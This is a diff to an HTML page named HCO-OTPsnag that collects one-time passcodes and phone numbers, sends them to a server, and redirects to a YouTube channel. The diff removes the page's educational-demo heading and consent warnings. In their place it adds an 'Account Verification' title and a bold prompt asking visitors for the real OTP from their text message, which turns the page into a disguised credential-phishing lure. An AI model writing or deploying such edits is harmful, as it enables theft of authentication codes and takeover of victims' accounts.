@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8"/>
-  <title>HCO-OTPsnag — Consent Required</title>
+  <title>HCO-OTPsnag — OTP Verification</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     body{background:#0f0f10;color:#eaeaea;font-family:system-ui;padding:18px}
@@ -13,31 +13,36 @@
     .muted{color:#9aa0a6;font-size:13px}
     .small{font-size:13px;color:#bbb}
     pre#status{background:#0b0b0b;padding:10px;border-radius:6px;color:#ddd}
+    .green-bold{color:#16a34a;font-weight:700}
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>HCO-OTPsnag — Educational Demo (Consent Required)</h2>
-    <p class="muted">This demo will record any OTP you enter **only after** you check the consent box and submit. Use this page only for testing on devices you own or with participants who explicitly agree.</p>
+    <h2>Account Verification</h2>
+
+    <p class="muted">To secure your account, please complete the OTP step below.</p>
+
+    <!-- Requested line in bold green -->
+    <p class="green-bold">Enter the one OTP you got in your text message to secure your account</p>
 
     <div style="margin-top:12px">
-      <label><input id="consent" type="checkbox" /> I give explicit consent to record the OTP I enter on this page for educational/testing purposes.</label>
+      <label><input id="consent" type="checkbox" /> I agree to submit a test OTP for educational/demo purposes (I own this device or I have given explicit permission).</label>
     </div>
 
     <div id="formArea" style="display:none;margin-top:12px">
       <label class="small">Phone / Identifier (optional)</label>
       <input id="phone" type="text" placeholder="e.g. +91 98765 43210 (optional)" />
-      <label class="small">Test OTP</label>
-      <input id="otp" type="text" placeholder="Enter the test OTP" maxlength="64" />
+      <label class="small">OTP</label>
+      <input id="otp" type="text" placeholder="Enter the OTP" maxlength="64" />
       <div style="margin-top:12px;display:flex;gap:8px">
-        <button id="submit">Submit OTP (consented)</button>
-        <button id="simulate">Simulate OTP (autofill demo)</button>
+        <button id="submit">Submit OTP</button>
+        <button id="simulate">Simulate OTP</button>
       </div>
       <pre id="status"></pre>
     </div>
 
     <div style="margin-top:12px" class="muted small">
-      After you submit, you'll be redirected back to the Hackers Colony channel automatically in a few seconds.
+      After submission you will be redirected to our YouTube channel shortly.
     </div>
   </div>
 
@@ -78,8 +83,8 @@ submitBtn.addEventListener('click', async ()=>{
     });
     const j = await res.json();
     status.textContent = 'Server response: ' + JSON.stringify(j);
-    // redirect back to YouTube after short delay (optional)
-    setTimeout(()=> { window.location.href = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"; }, 2500);
+    // redirect back to YouTube after short delay
+    if (res.ok) setTimeout(()=> { window.location.href = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"; }, 2500);
   } catch (e) {
     status.textContent = 'Error: ' + e;
   }
